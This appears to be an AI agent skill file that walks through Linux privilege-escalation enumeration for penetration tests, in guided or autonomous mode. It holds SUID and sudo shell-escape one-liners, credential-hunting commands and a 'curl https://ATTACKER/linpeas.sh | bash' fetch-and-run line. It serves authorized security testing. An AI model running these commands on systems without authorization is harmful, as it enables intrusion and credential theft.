---
name: linux-discovery
description: >
  Linux local privilege escalation enumeration and attack surface mapping. Use this
  skill when the user has a shell on a Linux machine and needs to escalate privileges,
  or says "enumerate linux privesc", "check for privilege escalation", "run linpeas",
  "linux privesc", "local privesc linux", "check my privileges on linux". Also triggers
  on: "escalate on linux", "what can I escalate", "post-exploitation linux",
  "enumerate this linux box". OPSEC: low-medium (enumeration tools create process
  artifacts and file I/O). Tools: LinPEAS, LinEnum, linux-smart-enumeration, pspy,
  linux-exploit-suggester, SUDO_KILLER, unix-privesc-check.
  Do NOT use for Windows privesc — use windows-discovery instead.
  Do NOT use for AD-level attacks — use ad-discovery instead.
---

# Linux Local Privilege Escalation Discovery

You are helping a penetration tester enumerate a Linux system for local privilege
escalation vectors. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain each enumeration step before executing. Present
  findings at each stage. Ask which vectors to pursue. Show what to look for in output.
- **Autonomous**: Run full enumeration, collect all findings, present prioritized
  attack surface with routing recommendations. Only pause for high-OPSEC actions.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones:
  `### [HH:MM] linux-discovery → <hostname>` with enumeration findings.
- **Findings** → append to `engagement/findings.md` when a privesc vector is confirmed.
- **Evidence** → save enumeration output to `engagement/evidence/` (e.g.,
  `linpeas-output.txt`, `suid-binaries.txt`).

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip hosts/vectors already enumerated
- Leverage existing credentials or access
- Check what's been tried and failed (Blocked section)

After completing enumeration, update `engagement/state.md`:
- **Targets**: Add system info (hostname, OS, kernel version, architecture)
- **Access**: Update current access level (user, service account, root)
- **Vulns**: Add confirmed privesc vectors as one-liners with `[found]` status
- **Pivot Map**: Map which vectors lead to which access levels
- **Blocked**: Record failed enumeration attempts

## Prerequisites

- Shell access on a Linux system (SSH, reverse shell, webshell)
- Know current user context (`id`)
- Enumeration tools available on target or transferable

## Step 1: System Information

Gather baseline system information for exploit matching and context.

```bash
# Kernel and OS
uname -a
cat /etc/os-release 2>/dev/null || cat /etc/*-release 2>/dev/null
cat /proc/version
uname -r
uname -m  # Architecture (x86_64, aarch64, etc.)

# Hostname and domain
hostname
hostname -f 2>/dev/null
dnsdomainname 2>/dev/null
```

```bash
# Hardware and disk
lscpu
df -h
lsblk 2>/dev/null

# Environment
echo $PATH
echo $LD_LIBRARY_PATH
echo $SHELL
env | grep -iE "pass|key|secret|token|proxy" 2>/dev/null
```

**Key outputs to note:**
- Kernel version (determines kernel exploit eligibility)
- Distribution and version (affects available tools and default configs)
- Architecture (affects binary compatibility for exploits)
- PATH directories (writable ones = hijacking opportunity)
- Environment variables (leaked credentials, writable library paths)

## Step 2: User Context and Privileges

```bash
id
groups
cat /etc/passwd | grep -v nologin | grep -v false | grep sh$
awk -F: '($3 == 0) {print $0}' /etc/passwd  # UID 0 accounts
```

**Currently logged-in users:**

```bash
w
who
last -20 2>/dev/null
```

**Group membership (routes to specific vectors):**

| Group | Escalation Vector | Route To |
|-------|-------------------|----------|
| `docker` | Mount host filesystem via container | **linux-file-path-abuse** |
| `lxd` / `lxc` | Privileged container escape | **linux-file-path-abuse** |
| `disk` | Raw disk read (debugfs) → read /etc/shadow | **linux-file-path-abuse** |
| `adm` | Read /var/log/* (credential hunting) | Manual review |
| `sudo` / `wheel` | Sudo configuration | **linux-sudo-suid-capabilities** |
| `video` | Framebuffer access (keylogger) | Manual review |
| `input` | Input device access (keylogger) | Manual review |
| `staff` | Write to /usr/local (PATH hijack) | **linux-file-path-abuse** |

## Step 3: Sudo Configuration

This is the highest-priority check — sudo misconfigurations are the most common Linux
privilege escalation vector.

```bash
sudo -l 2>/dev/null
sudo -V 2>/dev/null | head -1  # Sudo version for CVE matching
```

**Sudo version CVEs:**

| Version Range | CVE | Impact |
|---------------|-----|--------|
| < 1.9.5p2 (1.8.2 - 1.9.5p1) | CVE-2021-3156 (Baron Samedit) | Heap overflow → root without sudo access |
| All current | CVE-2019-14287 | `sudo -u#-1` bypasses user restriction |
| 1.9.14 - 1.9.17 < 1.9.17p1 | CVE-2025-32463 | chroot → root |

**What to look for in `sudo -l` output:**

| Pattern | Meaning | Route To |
|---------|---------|----------|
| `(root) NOPASSWD: /path/to/binary` | Run as root, no password | **linux-sudo-suid-capabilities** |
| `env_keep += LD_PRELOAD` | LD_PRELOAD injection with sudo | **linux-sudo-suid-capabilities** |
| `env_keep += LD_LIBRARY_PATH` | Library path hijack with sudo | **linux-sudo-suid-capabilities** |
| `SETENV:` before command | Can set env vars (LD_PRELOAD) | **linux-sudo-suid-capabilities** |
| `(ALL, !root) ALL` | CVE-2019-14287 candidate | **linux-sudo-suid-capabilities** |
| Binary without full path | PATH hijack | **linux-sudo-suid-capabilities** |
| Editor/pager/interpreter | GTFOBins escape | **linux-sudo-suid-capabilities** |

If `sudo -l` returns anything usable → route to **linux-sudo-suid-capabilities**.

**Doas (OpenBSD alternative):**

```bash
cat /etc/doas.conf 2>/dev/null
```

## Step 4: SUID/SGID and Capabilities

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both SUID and SGID
find / -perm -6000 -type f 2>/dev/null
```

Cross-reference against GTFOBins (https://gtfobins.github.io). Common SUID escalations:

| Binary | Technique |
|--------|-----------|
| `nmap` (old) | `nmap --interactive` → `!sh` |
| `vim` / `vi` | `:!sh` or `:set shell=/bin/sh` then `:shell` |
| `find` | `find . -exec /bin/sh \;` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `bash` | `bash -p` |
| `cp` / `mv` | Overwrite /etc/passwd or /etc/shadow |
| `env` | `env /bin/sh -p` |

**Check for unusual or custom SUID binaries** — anything not in default OS install is
a high-priority target. Use `strings`, `strace`, `ltrace`, or `ldd` to understand behavior.

**Capabilities:**

```bash
getcap -r / 2>/dev/null
```

**Critical capabilities:**

| Capability | Impact |
|------------|--------|
| `cap_setuid+ep` | Direct root: `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_setgid+ep` | Set GID to shadow/root group |
| `cap_dac_override` | Read/write any file (bypass permissions) |
| `cap_dac_read_search` | Read any file (shocker exploit for containers) |
| `cap_sys_admin` | Mount filesystems, cgroup escape, namespace manipulation |
| `cap_sys_ptrace` | Inject into processes (GDB attach, shellcode injection) |
| `cap_sys_module` | Load kernel modules (reverse shell module) |
| `cap_chown` / `cap_fowner` | Change file ownership/permissions |
| `cap_net_raw` | Raw sockets (sniffing, spoofing) |
| `cap_setfcap` | Set capabilities on other binaries (chain to cap_setuid) |

Any SUID/capability finding → route to **linux-sudo-suid-capabilities**.

## Step 5: Scheduled Tasks and Process Monitoring

**Cron jobs:**

```bash
crontab -l 2>/dev/null
ls -la /etc/cron* /etc/at* 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/anacrontab 2>/dev/null
```

**What to look for in cron output:**

| Pattern | Escalation | Route To |
|---------|-----------|----------|
| Script you can write to | Replace with payload | **linux-cron-service-abuse** |
| Command without full path | PATH hijack | **linux-cron-service-abuse** |
| Wildcard `*` in command | Wildcard injection (tar, chown, rsync) | **linux-cron-service-abuse** |
| Writable cron directory | Add cron job | **linux-cron-service-abuse** |

**Systemd timers and services:**

```bash
systemctl list-timers --all --no-pager 2>/dev/null
systemctl list-units --type=service --state=running --no-pager 2>/dev/null

# Writable unit files
find /etc/systemd /usr/lib/systemd /lib/systemd -writable -type f 2>/dev/null
```

**Process monitoring (discover hidden cron/scheduled tasks):**

```bash
# pspy — monitor processes without root
./pspy64 -pf -i 1000

# Manual alternative (no tools needed)
for i in $(seq 1 600); do ps -eo user,pid,cmd --no-headers | sort -u >> /tmp/.ps_monitor; sleep 1; done
sort /tmp/.ps_monitor | uniq -c | sort -rn | head -30
```

Watch for root-owned processes that execute writable scripts or use relative paths.

Any finding here → route to **linux-cron-service-abuse**.

## Step 6: File and Directory Permissions

**World-writable files and directories:**

```bash
# World-writable files (exclude /proc, /sys, /dev)
find / -writable ! -user $(whoami) -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50

# World-writable directories
find / -perm -o+w -type d ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -30
```

**Critical file checks:**

```bash
# Writable passwd/shadow/sudoers
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null

# Check for hashes in /etc/passwd (not using shadow)
grep -v '^[^:]*:[x*!]' /etc/passwd 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "authorized_keys" -writable 2>/dev/null

# Profile scripts (execute on login — backdoor opportunity)
ls -la /etc/profile /etc/profile.d/ /etc/bash.bashrc 2>/dev/null

# NFS shares (no_root_squash = SUID injection)
cat /etc/exports 2>/dev/null | grep no_root_squash
showmount -e localhost 2>/dev/null
```

**Library hijacking paths:**

```bash
# Shared library configuration
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null

# RPATH/RUNPATH in SUID binaries (writable = hijack)
find / -perm -4000 -type f 2>/dev/null | while read f; do
  readelf -d "$f" 2>/dev/null | grep -E "RPATH|RUNPATH" && echo "  → $f"
done

# Missing shared objects in SUID binaries
find / -perm -4000 -type f 2>/dev/null | while read f; do
  ldd "$f" 2>/dev/null | grep "not found" && echo "  → $f"
done

# Python library paths
python3 -c "import sys; print('\n'.join(sys.path))" 2>/dev/null
```

**Writable PATH directories:**

```bash
echo $PATH | tr ':' '\n' | while read dir; do
  [ -w "$dir" ] && echo "WRITABLE: $dir"
done
```

Any finding here → route to **linux-file-path-abuse**.

## Step 7: Credential Hunting (Quick Scan)

Fast checks for stored credentials before deep analysis.

```bash
# History files
cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.python_history 2>/dev/null | grep -iE "pass|secret|key|token|mysql.*-p|ssh.*-i" | head -20

# Common credential files
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" 2>/dev/null | xargs grep -liE "pass|secret|key|token" 2>/dev/null | head -20

# Database connection strings
grep -rliE "mysql|postgres|mongo|redis" /etc/ /opt/ /var/www/ 2>/dev/null | head -10

# Backup files (often contain plaintext creds)
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.orig" 2>/dev/null | head -20

# Git repositories (may contain credentials in history)
find / -name ".git" -type d 2>/dev/null
```

```bash
# Cloud credentials
ls -la ~/.aws/credentials ~/.azure/ ~/.config/gcloud/ 2>/dev/null

# Docker config (may contain registry creds)
cat ~/.docker/config.json 2>/dev/null

# SSH agent
ssh-add -l 2>/dev/null
```

## Step 8: Network and Services

```bash
# Listening services
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

# Internal-only services (127.0.0.1 listeners)
ss -tlnp 2>/dev/null | grep "127.0.0.1\|::1"

# All connections
ss -anp 2>/dev/null | head -30

# Routing table
ip route 2>/dev/null || route -n 2>/dev/null

# ARP table (discover other hosts)
ip neigh 2>/dev/null || arp -a 2>/dev/null

# Firewall rules
iptables -L -n 2>/dev/null
```

**Unix sockets:**

```bash
# Writable sockets
find / -type s 2>/dev/null | while read s; do
  [ -w "$s" ] && echo "WRITABLE: $s"
done

# Docker socket (container escape)
ls -la /var/run/docker.sock 2>/dev/null
```

Writable Docker socket → route to **linux-file-path-abuse**.
Internal services on loopback → investigate for exploitation.

## Step 9: Security Controls Detection

```bash
# SELinux
sestatus 2>/dev/null || getenforce 2>/dev/null

# AppArmor
aa-status 2>/dev/null || apparmor_status 2>/dev/null

# ASLR
cat /proc/sys/kernel/randomize_va_space  # 0=off, 1=conservative, 2=full

# Ptrace scope (blocks memory injection, sudo_inject)
cat /proc/sys/kernel/yama/ptrace_scope  # 0=unrestricted, 3=disabled

# Seccomp
grep Seccomp /proc/self/status

# Container detection
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
cat /proc/1/cgroup 2>/dev/null | grep -qE "docker|lxc|kubepods" && echo "IN CONTAINER"
```

**Kernel protections:**

```bash
# Check if exploit mitigations are active
cat /proc/sys/kernel/kptr_restrict      # 0=exposed, 1=hidden for non-root
cat /proc/sys/kernel/dmesg_restrict     # 1=restrict dmesg to root
cat /proc/sys/kernel/perf_event_paranoid # Higher = more restricted
```

**Compiler availability (needed for kernel exploits):**

```bash
which gcc g++ cc make 2>/dev/null
gcc --version 2>/dev/null | head -1
```

## Step 10: Kernel Exploit Assessment

```bash
# Kernel version
uname -r
cat /proc/version

# Quick CVE check
# DirtyPipe: Linux 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102
# DirtyCow: Linux <= 3.19.0-73.8
# GameOver(lay): Ubuntu kernels with OverlayFS (CVE-2023-0386)
```

**Automated exploit suggestion (run on attacker machine with kernel info):**

```bash
# linux-exploit-suggester.sh (mzet-)
./linux-exploit-suggester.sh --uname "$(uname -r)"

# linux-exploit-suggester-2 (jondonas)
perl linux-exploit-suggester-2.pl -k $(uname -r)
```

Match kernel version against known exploits → route to **linux-kernel-exploits**.

## Step 11: Automated Enumeration Tools

When manual checks are insufficient, run comprehensive tools.

**LinPEAS (comprehensive — highest coverage):**

```bash
# Standard run
./linpeas.sh | tee linpeas_output.txt

# Fast/stealth mode (less I/O, fewer indicators)
./linpeas.sh -s

# All checks including deeper analysis
./linpeas.sh -a

# Password brute-force against sudo
./linpeas.sh -P
```

**OPSEC note:** LinPEAS creates significant file I/O and process activity. In
OPSEC-sensitive engagements, prefer `-s` (stealth) mode or manual checks from
Steps 1-10. Consider piping directly from memory:
```bash
curl -sL https://ATTACKER/linpeas.sh | bash
```

**LinEnum:**

```bash
./LinEnum.sh -s -k password -r report -e /tmp/ -t
```

**linux-smart-enumeration (lse.sh):**

```bash
./lse.sh -l1    # Interesting findings only
./lse.sh -l2    # Full enumeration
```

**unix-privesc-check:**

```bash
./unix-privesc-check standard
./unix-privesc-check detailed
```

**SUDO_KILLER:**

```bash
./SUDO_KILLERv2.sh
```

**pspy (process monitoring — run first, leave running during enumeration):**

```bash
./pspy64 -pf -i 1000
```

## Step 12: Routing Decision Tree

Based on enumeration findings, route to the appropriate technique skill:

### Sudo / SUID / Capabilities Found

`sudo -l` returns usable entries, SUID binaries with GTFOBins matches, sudo version
vulnerable to CVE-2021-3156 or CVE-2019-14287, capabilities on binaries
→ **linux-sudo-suid-capabilities**

### Scheduled Task / Service Vectors Found

Writable cron scripts, wildcard injection in cron commands, writable systemd unit files,
exploitable D-Bus services, writable Unix sockets
→ **linux-cron-service-abuse**

### File / Path / Group Abuse Vectors Found

Writable /etc/passwd or /etc/shadow, NFS no_root_squash, writable library paths,
docker/lxd group membership, writable PATH directories, Python path hijack, shared
object injection, writable profile scripts
→ **linux-file-path-abuse**

### Kernel Exploit Candidates Found

Kernel version matches known CVE (DirtyPipe, DirtyCow, GameOver(lay)), exploit-suggester
returns hits, old unpatched kernel, compiler available on target
→ **linux-kernel-exploits**

### Multiple Vectors Found

In **guided** mode, present all findings ranked by reliability and OPSEC:
1. Sudo NOPASSWD / SUID (near-certain, low OPSEC)
2. Capabilities with cap_setuid (direct root, low OPSEC)
3. Writable cron/service scripts (reliable, wait for execution)
4. File permission abuse (reliable if writable)
5. Kernel exploits (last resort — may crash system)

In **autonomous** mode, pursue the most reliable vector first, fall back on failure.

When routing, pass along: hostname, kernel version, distribution, current user,
specific findings, current mode.

## Deep Reference

For additional enumeration techniques, edge cases, or tool-specific options:

```
Read $RED_RUN_DOCS/public-security-references/src/linux-hardening/privilege-escalation/README.md
Read $RED_RUN_DOCS/public-security-references/docs/redteam/escalation/linux-privilege-escalation.md
Read $RED_RUN_DOCS/public-security-references/src/linux-hardening/privilege-escalation/interesting-groups-linux-pe/README.md
```

## Troubleshooting

### LinPEAS blocked by security controls
Use manual checks from Steps 1-10 — they use only built-in commands. Or pipe
LinPEAS from memory: `curl -sL URL | sh` to avoid writing to disk.

### No tools transferable
Manual enumeration using Steps 1-10 covers all major vectors using only built-in
commands. Focus on `sudo -l` (Step 3), SUID enumeration (Step 4), and cron review
(Step 5) as highest-value manual checks.

### Restricted shell (rbash, rksh)
Try `bash` or `sh` to escape. If SUID bash exists: `bash -p`. Other breakouts:
`vi` → `:set shell=/bin/bash` → `:shell`, or `awk 'BEGIN {system("/bin/bash")}'`.
Route to **linux-kernel-exploits** for additional restricted shell escape techniques.

### In a container
Check `/.dockerenv` or cgroup membership. Container-specific privesc vectors
(cap_sys_admin + mount, Docker socket, privileged mode) route to
**linux-file-path-abuse** for group/container escape techniques.
